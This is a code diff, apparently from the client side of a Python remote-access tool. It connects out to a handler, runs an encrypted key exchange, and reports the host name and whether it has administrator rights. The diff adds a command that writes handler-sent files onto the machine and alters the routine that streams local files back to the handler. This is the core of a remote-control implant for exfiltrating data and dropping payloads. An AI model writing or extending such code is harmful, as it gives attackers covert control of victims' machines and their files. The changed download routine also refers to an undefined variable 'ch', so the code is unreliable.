@@ -166,7 +166,7 @@ class Transport:
 			self.comm_socket.connect((self.handler_ip, self.handler_port))
 			logging.info("Connected!")
 			self.comm_socket.sendall(chr(255)*30)
-			time.sleep(random.randint(1,5)) # Waiting a random amount of time since multiple clients
+			time.sleep(random.randint(100,500)/100) # Waiting a random amount of time since multiple clients
 			self.aes_obj = self.dh_exchange() # connecting at the exact same time causes the handler to hang
 			
 			data = socket.gethostname()+"|"+str(misc.isadmin())
@@ -263,6 +263,10 @@ class Transport:
 				junk, channel, file = signal.split(":")
 				channel = self.channels[channel]
 				fs.download(file, channel)
+			elif signal.startswith("UPLOAD_FILE"):
+				junk, channel, file = signal.split(":")
+				channel = self.channels[channel]
+				fs.upload(file, channel)
 				
 	def create_channel(self, id):
 		self.channels[id] = Channel(id, self.master_queue)
@@ -306,17 +310,29 @@ class Filesystem:
 			return str(e)
 			
 	def download(self, path, channel):
-		logging.info("Starting download.")
+		logging.info("Starting download of file: "+path)
 		try:
 			with open(path, "rb") as f:
 				while True:
-					data = f.read(4096)
+					data = f.read(8192)
 					if not data: break
 					channel.write_output(data)
-			time.sleep(1)
-			channel.write_output(chr(255))
+					time.sleep(0.1)
+			time.sleep(2)
+			ch.write_output(chr(255)*50)
+			time.sleep(5)
 		except Exception as e:
 			channel.write_output("Error: "+str(e))
+			
+	def upload(self, path, channel):
+		logging.info("Starting upload of file: "+path)
+		
+		with open(path, "wb") as f:
+			while True:
+				data = channel.read_input()
+				if data.endswith(chr(255)): break
+				f.write(data)
+			logging.info("Upload complete.")
 			
 class Miscellaneous:
 	"""
